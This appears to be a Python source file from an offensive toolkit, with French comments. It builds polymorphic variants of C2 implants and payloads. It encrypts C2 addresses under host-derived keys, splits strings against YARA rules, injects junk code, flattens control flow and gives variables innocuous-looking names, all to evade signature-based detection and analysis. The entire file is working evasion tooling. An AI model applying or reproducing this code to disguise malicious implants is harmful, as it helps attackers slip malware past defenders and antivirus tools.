"""
attack/obfuscation/polymorph.py — Polymorphisme et obfuscation de code
========================================================================

Outils pour générer des variants polymorphes d'implants C2 ou de payloads
Python, en appliquant :
  1. Chiffrement AES-GCM des strings littérales sensibles (domaines, IPs)
  2. Injection de junk code (opérations no-op, calculs inutiles)
  3. Split de strings en N morceaux concaténés à runtime
  4. Control-flow flattening simplifié (déplacement d'instructions)
  5. Renommage aléatoire de variables locales

Références :
  - "Polymorphic Worms and Shellcode" (Phrack #61, 2003)
  - EMBER dataset : obfuscation contre les signatures statiques
  - MITRE ATT&CK T1027 (Obfuscated Files or Information)
"""

from __future__ import annotations

import base64
import hashlib
import os
import random
import secrets
import string
import uuid
from collections.abc import Callable
from dataclasses import dataclass, field
from typing import Any, ClassVar, Dict, List, Optional, Tuple

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    _HAS_CRYPTOGRAPHY = True
except Exception:
    _HAS_CRYPTOGRAPHY = False


# ---------------------------------------------------------------------------
# 1. Chiffrement AES-GCM des strings
# ---------------------------------------------------------------------------

class AESStringEncryptor:
    """
    Chiffre les strings sensibles (IP, domains, URLs de C2) avec AES-GCM.
    La clé est dérivée à runtime d'un token hardware (PID, MAC, hostname)
    pour qu'un simple strings sur le binaire ne révèle rien.
    """

    def __init__(self, key: bytes | None = None) -> None:
        if key is None:
            key = self._derive_runtime_key()
        if len(key) not in (16, 24, 32):
            key = hashlib.sha256(key).digest()[:32]
        self.key = key

    @staticmethod
    def _derive_runtime_key() -> bytes:
        """
        Dérive une clé à partir de caractéristiques runtime.
        Dans un implant, on y ajouterait ProcessId, VolumeSerial, etc.
        """
        raw = "|".join([
            os.environ.get("HOSTNAME", "default"),
            os.environ.get("USER", "default"),
            str(os.getpid()),
            str(uuid.getnode()),
            "vantablack_static_salt_v3",
        ])
        return hashlib.sha256(raw.encode()).digest()

    def encrypt(self, plaintext: str) -> dict[str, str]:
        """
        Retourne {nonce_b64, ciphertext_b64, tag_b64, version}.
        """
        if _HAS_CRYPTOGRAPHY:
            aes = AESGCM(self.key)
            nonce = secrets.token_bytes(12)
            data = plaintext.encode("utf-8")
            ct = aes.encrypt(nonce, data, None)
            # CT est concaténé : cipher + tag (16 derniers octets)
            ciphertext = ct[:-16]
            tag = ct[-16:]
            return {
                "nonce": base64.b64encode(nonce).decode(),
                "ciphertext": base64.b64encode(ciphertext).decode(),
                "tag": base64.b64encode(tag).decode(),
                "version": "aes-256-gcm-v1",
            }
        else:
            # Fallback XOR + base64 si cryptography absent (test labo)
            pad = secrets.token_bytes(max(16, len(plaintext)))
            pt = plaintext.encode("utf-8")
            ct = bytes(pt[i] ^ pad[i % len(pad)] for i in range(len(pt)))
            return {
                "nonce": base64.b64encode(pad).decode(),
                "ciphertext": base64.b64encode(ct).decode(),
                "tag": base64.b64encode(hashlib.sha256(ct + pad).digest()[:8]).decode(),
                "version": "xor-base64-fallback",
            }

    def encrypt_string(self, plaintext: str) -> str:
        """Chiffre une string et retourne un blob base64 (format compact).

        Format : nonce_b64 + ":" + (ciphertext+tag)_b64. Pratique pour
        stocker une string chiffrée dans une seule variable.
        """
        blob = self.encrypt(plaintext)
        return f"{blob['nonce']}:{blob['ciphertext']}{blob['tag']}"

    def decrypt_string(self, compact: str) -> str:
        """Déchiffre un blob produit par encrypt_string()."""
        nonce_b64, rest = compact.split(":", 1)
        raw = base64.b64decode(rest)
        if not _HAS_CRYPTOGRAPHY:
            raise RuntimeError("package 'cryptography' requis pour AES-GCM")
        aes = AESGCM(self.key)
        return aes.decrypt(base64.b64decode(nonce_b64), raw, None).decode("utf-8")

    def decrypt(self, blob: dict[str, str]) -> str:
        if blob.get("version") == "xor-base64-fallback":
            pad = base64.b64decode(blob["nonce"])
            ct = base64.b64decode(blob["ciphertext"])
            return bytes(ct[i] ^ pad[i % len(pad)] for i in range(len(ct))).decode("utf-8")
        if not _HAS_CRYPTOGRAPHY:
            raise RuntimeError("package 'cryptography' requis pour AES-GCM")
        aes = AESGCM(self.key)
        nonce = base64.b64decode(blob["nonce"])
        ct = base64.b64decode(blob["ciphertext"]) + base64.b64decode(blob["tag"])
        return aes.decrypt(nonce, ct, None).decode("utf-8")


def encrypt_string(s: str) -> dict[str, str]:
    return AESStringEncryptor().encrypt(s)


def decrypt_string(blob: dict[str, str]) -> str:
    return AESStringEncryptor().decrypt(blob)


# ---------------------------------------------------------------------------
# 2. Split de strings anti-YARA
# ---------------------------------------------------------------------------

def obfuscate_string(s: str, n_parts: int = 5) -> tuple[list[str], str]:
    """
    Coupe une string en N morceaux aléatoires, mélangés avec des
    placeholders. Retourne (liste des morceaux, code de recombinaison).
    """
    n = len(s)
    if n_parts < 2 or n < n_parts:
        n_parts = max(2, min(n, 4))
    positions = sorted(random.sample(range(1, n), n_parts - 1))
    pieces: list[str] = []
    start = 0
    for pos in positions:
        pieces.append(s[start:pos])
        start = pos
    pieces.append(s[start:])
    # Création du code de recombinaison
    var_names = [_random_var_name() for _ in pieces]
    declaration_lines = [f'{v} = "{p}"' for v, p in zip(var_names, pieces)]
    recombined = " + ".join(var_names)
    code = "\n".join(declaration_lines) + "\n" + f"result = {recombined}"
    return pieces, code


# ---------------------------------------------------------------------------
# 3. Junk Code Generator
# ---------------------------------------------------------------------------

@dataclass
class JunkCodeGenerator:
    """
    Génère des fragments de code inutiles mais valides pour "diluer"
    les signatures statiques. Chaque morceau produit des valeurs
    numériques ou des strings qui ne sont jamais utilisées.

    NOTE : Les attributs `_JUNK_FUNCTIONS_PY/_GO` sont des attributs de
    classe hors dataclass (pour éviter mutable default list) ; ils sont
    remplis par référence via les méthodes d'instance.
    """

    language: str = "python"  # "python" | "go" | "c"
    seed: int | None = None

    # Attributs de classe (ClassVar → exclus des champs dataclass)
    _JUNK_FUNCTIONS_PY: ClassVar[list[Callable[[], str]]] = []
    _JUNK_FUNCTIONS_GO: ClassVar[list[Callable[[], str]]] = []

    def __post_init__(self) -> None:
        if self.seed is not None:
            random.seed(self.seed)

    def generate(self, n_lines: int = 5, count: int | None = None,
                 language: str | None = None) -> str:
        """Génère des lignes de junk code.

        Args:
            n_lines : nombre de lignes (alias historique ``count``)
            count   : compatibilité ascendante
            language: override du langage de l'instance ("python"|"go"|"py")
        """
        n = count if count is not None else n_lines
        lang = (language or self.language).lower()
        if lang in ("py", "python", "py3"):
            generators = [
                self._junk_py_hashloop,
                self._junk_py_listcomp,
                self._junk_py_math,
                self._junk_py_hexconv,
                self._junk_py_strformat,
            ]
        elif lang in ("go", "golang"):
            generators = [
                self._junk_go_hash,
                self._junk_go_slice,
                self._junk_go_math,
                self._junk_go_strconv,
            ]
        else:
            generators = [self._junk_py_math]
        lines: list[str] = []
        for _ in range(n):
            lines.append(random.choice(generators)())
        return "\n".join(lines)

    # --- Python -------------------------------------------------------

    def _junk_py_hashloop(self) -> str:
        v = _random_var_name()
        salt = secrets.token_hex(3)
        return (
            f'{v} = hashlib.sha256(b"{salt}").hexdigest()'
            f'  # obfuscation-junk'
        )

    def _junk_py_listcomp(self) -> str:
        v = _random_var_name()
        n = random.randint(8, 64)
        return f'{v} = [x * {random.randint(2, 9)} for x in range({n}) if x % 2]'

    def _junk_py_math(self) -> str:
        v = _random_var_name()
        a, b = random.randint(1, 100000), random.randint(1, 100000)
        return f'{v} = math.gcd({a}, {b}) * math.isqrt({a * b})'

    def _junk_py_hexconv(self) -> str:
        v = _random_var_name()
        raw = secrets.token_bytes(random.randint(8, 24)).hex()
        return f'{v} = bytes.fromhex("{raw}").decode("latin-1")  # junk'

    def _junk_py_strformat(self) -> str:
        v = _random_var_name()
        a, b, c = (random.randint(10, 99) for _ in range(3))
        return f'{v} = f"junk-{a}:{b}-{c}-{{uuid.uuid4().hex[:6]}}"'

    # --- Go -----------------------------------------------------------

    def _junk_go_hash(self) -> str:
        v = _random_var_name()
        return f'{v} := sha256.Sum256([]byte("{secrets.token_hex(4)}"))'

    def _junk_go_slice(self) -> str:
        v = _random_var_name()
        n = random.randint(8, 32)
        return f'{v} := make([]int, 0, {n}); for i := 0; i < {n}; i++ {{ {v} = append({v}, i*{random.randint(2, 9)}) }}'

    def _junk_go_math(self) -> str:
        v = _random_var_name()
        a, b = random.randint(1, 1000), random.randint(1, 1000)
        return f'{v} := int(math.Sqrt(float64({a} * {a} + {b} * {b})))'

    def _junk_go_strconv(self) -> str:
        v = _random_var_name()
        n = random.randint(1, 1000000)
        return f'{v}, _ := strconv.Atoi(strconv.Itoa({n}))'


# ---------------------------------------------------------------------------
# 4. Control Flow Flattener (basique)
# ---------------------------------------------------------------------------

class ControlFlowFlattener:
    """
    Transforme une suite d'étapes en un switch/dispatch table où l'ordre
    est déterminé par une variable d'état. Rend l'analyse statique
    plus difficile car le graph de contrôle n'est plus linéaire.

    Version simplifiée : on génère un squelette Python/Go.
    """

    @staticmethod
    def flatten_python(steps: list[tuple[str, str]]) -> str:
        """
        Chaque step = (state_label, code_line).
        Retourne un block Python avec dispatch while + if/elif.
        """
        dispatch = []
        last_idx = len(steps) - 1
        last_label = steps[last_idx][0]
        # Pseudo-état de transition : permet d'exécuter le corps du label
        # terminal PUIS de sortir de la boucle (sinon le while sortirait
        # avant que le corps terminal ne s'exécute).
        pre_done = f"__exec_{last_label}"
        for i, (label, code) in enumerate(steps):
            dispatch.append(f'        if _state == "{label}":')
            dispatch.append(f"            {code}")
            if i < last_idx:
                next_state = steps[i + 1][0] if i + 1 < last_idx else pre_done
                dispatch.append(f'            _state = "{next_state}"')
                dispatch.append("            continue")
        dispatch.append(f'        if _state == "{pre_done}":')
        dispatch.append(f"            {steps[last_idx][1]}")
        dispatch.append('            _state = "done"')
        dispatch.append("            continue")
        return (
            f'_state = "{steps[0][0]}"\n'
            + 'while _state != "done":\n'
            + "\n".join(dispatch)
            + '\n        else:\n            _state = "done"'
            + "\n"
        )

    @staticmethod
    def flatten_go(steps: list[tuple[str, str]]) -> str:
        """
        Génère un for { switch { ... } } pour Go.
        """
        cases = []
        for i, (label, code) in enumerate(steps):
            cases.append(f'\tcase "{label}":')
            cases.append(f"\t\t{code}")
            next_state = steps[i + 1][0] if i + 1 < len(steps) else "done"
            cases.append(f'\t\tstate = "{next_state}"')
        return (
            f'state := "{steps[0][0]}"\n'
            "for state != \"done\" {\n\tswitch state {\n"
            + "\n".join(cases)
            + "\n\t}\n}\n"
        )


# ---------------------------------------------------------------------------
# 5. Variant polymorphe complet
# ---------------------------------------------------------------------------

@dataclass
class PolymorphicVariant:
    """Une variante d'un payload avec des métadonnées."""

    variant_id: str
    seed: int
    junk_lines: int
    strings_encrypted: int
    strings_split: int
    flattened: bool
    variable_map: dict[str, str] = field(default_factory=dict)
    code: str = ""
    checksum: str = ""

    @property
    def obfuscated_code(self) -> str:
        """Alias du code obfusqué (nommage contrat godmode)."""
        return self.code


class CodeObfuscator:
    """Façade combinant toutes les techniques."""

    def __init__(self, language: str = "python", seed: int | None = None) -> None:
        self.language = language
        self.seed = seed or random.randint(0, 1 << 30)
        random.seed(self.seed)
        self._junk_gen = JunkCodeGenerator(language=language, seed=self.seed)

    def obfuscate(
        self,
        source_lines: list[str] | str,
        sensitive_strings: list[str] | None = None,
        junk_ratio: float = 0.4,
        flatten: bool = True,
        rename_vars: bool = True,
    ) -> PolymorphicVariant:
        """
        Prend des lignes de code source brut et applique l'obfuscation.

        Args:
            source_lines : code source à obfusquer
            sensitive_strings : strings à chiffrer (IPs, domains)
            junk_ratio : ratio junk / code réel
            flatten : appliquer control-flow flattening
            rename_vars : renommer les variables locales
        """
        var_map: dict[str, str] = {}
        # Accepte du code source brut (str) ou une liste de lignes
        if isinstance(source_lines, str):
            lines = source_lines.splitlines()
        else:
            lines = list(source_lines)
        sensitive_strings = sensitive_strings or []

        # 1) Renommage de variables
        renamed_encrypted_count = 0
        if rename_vars:
            lines, var_map = self._rename_vars(lines)

        # 2) Chiffrement des strings sensibles
        encryptor = AESStringEncryptor()
        encrypted_blobs: list[str] = []
        for s in sensitive_strings:
            blob = encryptor.encrypt(s)
            encrypted_blobs.append(
                f'_enc_{secrets.token_hex(3)} = {blob!r}  # string: {s[:4]}***'
            )
            renamed_encrypted_count += 1
        lines = encrypted_blobs + lines

        # 3) Junk code injection (avant/après)
        n_junk = max(3, int(len(lines) * junk_ratio))
        before = self._junk_gen.generate(n_junk // 2).splitlines()
        after = self._junk_gen.generate(max(1, n_junk - len(before))).splitlines()
        lines = before + lines + after

        # 4) Control-flow flattening — UNIQUEMENT si le code se prête au
        # découpage en états simples : chaque bloc doit être un statement
        # mono-ligne au niveau d'indentation 0 (pas de def/for/if multi-
        # lignes ni de code indenté, sinon la structure Python est cassée).
        can_flatten = (
            flatten
            and self.language in ("python", "py")
            and len(lines) >= 6
            and all(
                (not ln.strip()) or (not ln.startswith((" ", "\t")))
                for ln in lines
            )
        )
        if can_flatten:
            chunks: list[tuple[str, str]] = []
            # Groupe les lignes par blocs de 2 pour les étapes
            for i in range(0, len(lines), 2):
                block = " ; ".join(
                    ln.strip() for ln in lines[i:i + 2] if ln.strip()
                )
                chunks.append((f"s{i}", block or "pass"))
            lines = [ControlFlowFlattener.flatten_python(chunks)]
        elif flatten and self.language not in ("python", "py") and len(lines) >= 6:
            chunks: list[tuple[str, str]] = []
            for i in range(0, len(lines), 2):
                block = "\n            ".join(lines[i:i + 2])
                chunks.append((f"s{i}", block or "pass"))
            lines = [ControlFlowFlattener.flatten_go(chunks)]

        code = "\n".join(lines)
        checksum = hashlib.sha256(code.encode("utf-8")).hexdigest()

        variant = PolymorphicVariant(
            variant_id=secrets.token_hex(6),
            seed=self.seed,
            junk_lines=n_junk,
            strings_encrypted=renamed_encrypted_count,
            strings_split=0,
            flattened=flatten,
            variable_map=var_map,
            code=code,
            checksum=checksum,
        )
        # Compatibilité : l'orchestrateur et les tests attendent une string
        # exécutable ; le détail variant reste accessible via .last_variant.
        self.last_variant = variant
        return code

    @staticmethod
    def _rename_vars(lines: list[str]) -> tuple[list[str], dict[str, str]]:
        """
        Renomme les variables locales identifiées par un motif simple :
        noms de 2-8 lettres en snake_case qui apparaissent en début de ligne.
        """
        mapping: dict[str, str] = {}
        output: list[str] = []
        import re
        pattern = re.compile(r"\b([a-z_][a-z0-9_]{2,9})\b")
        for line in lines:
            def repl(m):
                name = m.group(1)
                # Éviter les mots-clés
                if name in {"for", "def", "if", "else", "return", "and",
                            "or", "not", "in", "is", "try", "except",
                            "pass", "break", "continue", "import", "from",
                            "print", "true", "false", "none", "self",
                            "class", "while", "with", "as", "lambda"}:
                    return name
                if name not in mapping:
                    mapping[name] = _random_var_name()
                return mapping[name]
            output.append(pattern.sub(repl, line))
        return output, mapping


def generate_polymorphic_variant(
    code_lines: list[str],
    language: str = "python",
    sensitive_strings: list[str] | None = None,
) -> PolymorphicVariant:
    """Helper pratique : génère une variante polymorphe (objet complet)."""
    ob = CodeObfuscator(language=language)
    ob.obfuscate(code_lines, sensitive_strings=sensitive_strings)
    return ob.last_variant


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _random_var_name() -> str:
    """Nom de variable pseudo-significatif pour ne pas éveiller l'attention."""
    prefixes = [
        "buf", "ctx", "cfg", "len_", "cnt", "idx", "key", "val", "ptr",
        "vec", "opt", "res", "tmp", "src", "dst", "pos", "seed", "hash",
        "sum_", "acc", "tok", "node", "item", "flag", "size", "offset",
        "chunk", "blob", "row", "col", "cell", "pid", "fd", "sock",
        "addr", "port", "conn", "frame", "msg", "payload", "hdr", "body",
    ]
    prefix = random.choice(prefixes)
    suffix = "".join(random.choices(string.ascii_lowercase, k=random.randint(1, 4)))
    return prefix + "_" + suffix if suffix else prefix
